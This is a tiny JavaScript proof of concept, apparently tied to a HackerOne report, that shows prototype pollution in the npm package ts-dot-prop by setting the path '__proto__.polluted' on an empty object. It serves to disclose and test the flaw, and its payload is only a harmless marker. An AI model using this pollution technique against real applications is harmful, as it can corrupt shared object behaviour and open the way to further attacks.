//https://hackerone.com/reports/980599
 
  const tsDot = require("ts-dot-prop");

  let obj = {};
   

  tsDot.set(obj, "__proto__.polluted", "yes");
// End of file
